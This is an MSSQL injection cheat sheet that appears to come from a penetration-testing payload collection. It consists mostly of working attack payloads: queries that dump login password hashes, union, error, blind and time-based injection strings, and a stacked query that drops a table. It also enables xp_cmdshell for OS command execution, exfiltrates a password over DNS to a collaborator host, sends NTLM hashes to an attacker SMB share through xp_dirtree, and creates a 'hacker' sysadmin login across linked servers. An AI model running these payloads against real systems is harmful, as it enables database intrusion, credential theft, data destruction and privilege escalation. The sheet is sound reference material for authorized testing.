# MSSQL Injection

## Summary

* [MSSQL comments](#mssql-comments)
* [MSSQL version](#mssql-version)
* [MSSQL database name](#mssql-database-name)
* [MSSQL List databases](#mssql-list-databases)
* [MSSQL List columns](#mssql-list-columns)
* [MSSQL List tables](#mssql-list-tables)
* [MSSQL Extract user/password](#mssql-extract-userpassword)
* [MSSQL Union Based](#mssql-union-based)
* [MSSQL Error Based](#mssql-error-based)
* [MSSQL Blind Based](#mssql-blind-based)
* [MSSQL Time Based](#mssql-time-based)
* [MSSQL Stacked query](#mssql-stacked-query)
* [MSSQL Command execution](#mssql-command-execution)
* [MSSQL Out of band](#mssql-out-of-band)
    * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
    * [MSSQL UNC path](#mssql-unc-path)
* [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
* [MSSQL Trusted Links](#mssql-trusted-links)

## MSSQL comments

```sql
-- comment goes here
/* comment goes here */
```

## MSSQL User

```sql
SELECT CURRENT_USER
```

## MSSQL version

```sql
SELECT @@version
```

## MSSQL database name

```sql
SELECT DB_NAME()
```

## MSSQL List databases

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
```

## MSSQL List columns

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

## MSSQL List tables

```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
```

## MSSQL Extract user/password

```sql
MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## MSSQL Union Based

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```

## MSSQL Error based

```sql
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```

## MSSQL Blind based

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

## MSSQL Time based

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
```

## MSSQL Stacked Query

Use a semi-colon ";" to add another query

```sql
ProductID=1; DROP members--
```

## MSSQL Command execution

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

To interact with the MSSQL instance.

```powershell
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

Execute Python script 

> Executed by a different user than the one using xp_cmdshell to execute commands

```powershell
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

## MSSQL Out of band

### MSSQL DNS exfiltration

Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1

```powershell
1 and exists(select * from fn_trace_gettable('\\'%2b(select pass frop users where id=1)%2b'.xxxxxxx.burpcollaborator.net\1.trc',default))
```


### MSSQL UNC Path

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

## MSSQL Make user DBA (DB admin)

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL Trusted Links

> The links between databases work even across forest trusts.

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
```

Manual exploitation

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## References

* [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
